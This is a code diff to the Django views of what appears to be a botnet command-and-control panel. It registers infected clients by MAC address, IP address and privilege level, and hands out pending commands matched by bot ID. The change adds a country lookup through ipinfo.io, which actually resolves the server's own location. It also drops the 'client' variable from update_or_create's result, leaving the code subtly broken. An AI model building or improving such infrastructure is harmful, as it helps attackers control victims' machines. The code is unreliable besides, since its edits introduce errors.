@@ -4,6 +4,7 @@ from django.utils.timezone import now
 from django.shortcuts import get_object_or_404
 from .models import Client, Command
 import json
+from urllib.request import urlopen
 
 @csrf_exempt
 def register(request):
@@ -17,12 +18,15 @@ def register(request):
             arch = data.get('arch')
             ip_address = data.get('ip_address')
             privileges = data.get('privileges')
-            country = data.get('country', '')
+            url = 'http://ipinfo.io/json'
+            response = urlopen(url)
+            ipinfo = json.load(response)
+            country = ipinfo['country']
 
             if not mac:
                 return JsonResponse({'error': 'Missing mac'}, status=400)
 
-            client, created = Client.objects.update_or_create(
+            created = Client.objects.update_or_create(
                 mac=mac,
                 defaults={
                     'status': status,
@@ -30,7 +34,7 @@ def register(request):
                     'arch': arch,
                     'ip_address': ip_address,
                     'privileges': privileges,
-                    'country': country,
+                    'country': country if country else 'None',
                     'last_seen': now()
                 }
             )
@@ -55,7 +59,7 @@ def get_command(request):
         client.last_seen = now()
         client.save()
         
-        command = Command.objects.filter(id=client.id, executed=0).values().first()
+        command = Command.objects.filter(bot_id=client.id, executed=0).values().first()
         print(f"command: {command}")
         if command:
             return JsonResponse({
